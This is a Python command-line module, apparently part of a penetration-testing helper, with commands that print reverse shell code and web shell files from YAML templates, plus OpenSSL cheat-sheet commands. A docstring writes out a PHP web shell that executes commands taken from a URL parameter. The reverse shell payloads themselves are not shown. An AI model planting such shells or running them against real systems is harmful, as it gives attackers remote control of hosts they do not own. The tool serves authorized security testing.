import click
from .lazypt import ShellFile, RevShell, OpenSSL

# Loaded dinamically from revshell.yaml file
# Add elements there to use them with the program
choices = RevShell.get_langs(RevShell, 'yaml/revshell.yaml')
choices_shellfile = RevShell.get_langs(RevShell, 'yaml/shellfile.yaml')

# Commands: rce, shellfile
@click.group()
def commands():
    pass

@commands.command()
@click.option("--lang", help="Switch scripting language.", type=click.Choice(choices_shellfile))
@click.argument('filename')
def outfile(lang, filename):
    """ Creates a cmd file like <?php echo shell_exec($_GET['cmd']); ?>. Edit shellfile.yaml to add/edit your code"""
    f = ShellFile(lang, filename)
    print(f)

@commands.command()
# @click.option("--lang", help="Switch scripting language.", type=click.Choice(choices))
@click.argument('lhost')
@click.argument('lport')
@click.argument('lang', type=click.Choice(choices))
def rsh(lang: str, lhost: str, lport: int):
    """ Copy the chosen reverse shell code to the clipboard. It allows to switch the scripting language. (Does not run the commands) """
    s = RevShell(lang, lhost, lport)
    print(s)

choices_ossl = RevShell.get_langs(RevShell, 'yaml/openssl.yaml')
choices_ossl.append("help")

@commands.command()
@click.option("--action", help="--action help to list all the actions", type=click.Choice(choices_ossl))
def ossl(action):
    """ Cheatsheet to convert SSL certificates. --action help to view the description of the choices."""
    ossl = OpenSSL(action)

    if action == 'help':
        infos = ossl.get_all_info()
        print('\n')
        print('[+] Action list:')
        for element in infos:
            for k, v in element.items():
                print('--action ' + k + ': ' + v)
    else:
        print(ossl.get_data('cmd'))


if __name__ == "__main__":
    commands()



